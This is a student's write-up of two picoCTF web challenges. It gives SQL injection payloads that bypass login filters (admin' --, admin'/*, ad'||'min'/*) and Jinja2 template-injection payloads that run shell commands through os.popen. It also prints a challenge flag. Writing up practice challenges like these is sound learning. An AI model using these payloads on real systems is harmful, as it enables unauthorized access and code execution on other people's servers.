# 1.   Web Gauntlet 
Can you beat the filters?
Additional details will be available after launching your challenge instance.

## SOLUTION
- After clicking Launch Instance we get 2 links http://shape-facility.picoctf.net:60436/ and http://shape-facility.picoctf.net:60436/filter.php
- one has a login page like this

- and the other is a filter site with the word "or"
- while reading hints we realise that we shouldn't be using valid creditionals and must use sqlite.
- so came to the conclusion of using sql injections payloads and not use "or" for round one 
- admin' -- with random password helped pass into round 2

- now the filter website becomes "or and like = --" so, i use admin'/*

- now filter website becomes "or and = like > < --" so i use the same admin'/*
<img width="1897" height="789" alt="image" src="https://github.com/user-attachments/assets/c04c59d3-dd16-4d47-a73f-51ea1894fc5e" />
- now filter website becomes "or and = like > < -- admin" so i use ad'||'min'/*
<img width="1912" height="686" alt="Screenshot 2025-10-24 201056" src="https://github.com/user-attachments/assets/7f02a81d-975b-4c1a-b0d9-8d7d389530a7" />
- now filter website becomes "or and = like > < -- union admin" so i once again use ad'||'min'/*
<img width="1910" height="957" alt="Screenshot 2025-10-24 201307" src="https://github.com/user-attachments/assets/b1896c2d-91d2-408f-a32a-5272743338a5" />

now finally obtains the flag from filter website

## FLAG 
picoCTF{y0u_m4d3_1t_79a0ddc6}

## CONCEPTS LEARNED 
- how sql injection is a powerful tool to bypass the restrictions by injecting malicious SQL code into a query that an application sends to its database.
- how different payloads help us bybass different filters
- how || helps us combine two strings

# 2.  SSTI1
I made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.

## SOLUTION
- after running start instance we are sent to this site

- the given hint is Server Side Template Injection so after researching more about it we will come across various Common Vulnerable Frameworks so to check we can do trial and error
- when we input {{7*7}} we get 49 so it confirms we use Jinja2
- so when i typed in  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}  to list out the files on the server to find the name of the file with the flag

- so with all this info we can use {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag')['read']()}} to obtain the flag

## CONCEPTS LEARNED 
- how Server-Side Template Injection (SSTI) is a critical vulnerability that can give attackers the ability to execute arbitrary code on the server. 
- how instead of creating a whole new page per person that accesses the site, it will simply render the remote address into the {{ip}} variable, while reusing the rest of the HTML for each person request the server receives to that endpoint.
